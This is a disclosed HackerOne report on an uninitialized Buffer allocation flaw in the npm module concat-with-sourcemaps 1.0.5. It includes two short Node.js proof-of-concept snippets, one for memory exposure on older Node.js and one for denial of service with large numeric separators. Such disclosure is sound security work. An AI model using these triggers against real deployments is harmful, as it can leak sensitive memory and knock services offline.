# `concat-with-sourcemaps` allocates uninitialized Buffers when number is passed as a separator

## Report Details
- **Report ID**: 320166
- **URL**: https://hackerone.com/reports/320166
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-02-27T04:40:33.617Z
- **Disclosed**: 2018-04-28T20:05:00.500Z

## Reporter
- **Username**: chalker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report an uninitialized Buffer allocation issue in `concat-with-sourcemaps`.
It allows to extract sensitive data from uninitialized memory or to cause a DoS by passing in a large number, in (unlikely) setups where `separator` is attacker-controlled.

# Module

**module name:** `concat-with-sourcemaps`
**version:** 1.0.5
**npm page:** `https://www.npmjs.com/package/concat-with-sourcemaps`

## Module Description

> NPM module for concatenating files and generating source maps.

## Module Stats

65 161 downloads in the last day
360 873 downloads in the last week
1 506 421 downloads in the last month

~18 077 052 estimated downloads per year

# Vulnerability

## Vulnerability Description

See https://github.com/floridoo/concat-with-sourcemaps/blob/master/index.js#L18

The problem arises when a number is passed as a separator. That is unlikely to be attacker-controlled in real-world setups, but not impossible. The API should not propagate the already-bad Buffer issue further.

On Node.js 6.x and below, this exposes uninitialized memory, which could contain sensitive data.

On all Node.js versions, this can cause a DoS when a big enough number (e.g. 1e8 or 1e9) is specified as a separator.

## Steps To Reproduce:

Uninitialized memory exposure (Node.js 6.x and below):

```
const Concat = require('concat-with-sourcemaps');
var concat = new Concat(true, 'all.js', 234); // separator is 234
concat.add(null, "// (c) John Doe");
concat.add('file1.js', "const a = 10;");
concat.add('file2.js', "const b = 20;");
console.log(concat.content.toString('utf-8'));
```

DoS (any Node.js version):

Use e.g. 1e8, 1e9, or 1e10 to cause different effect (and depending on the Node.js version).

```
const Concat = require('concat-with-sourcemaps');
var concat = new Concat(true, 'all.js', 1e8); // separator is 234
concat.add(null, "// (c) John Doe");
concat.add('file1.js', "const a = 10;");
concat.add('file2.js', "const b = 20;");
console.log(concat.content.toString('utf-8'));
```

## Supporting Material/References:

- OS: Arch Linux current
- Node.js 9.5.0
- npm 5.6.0

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

Sensitive uninitialized memory exposure (on Node.js 6.x and below)
Denail of Service

## Attachments
No attachments
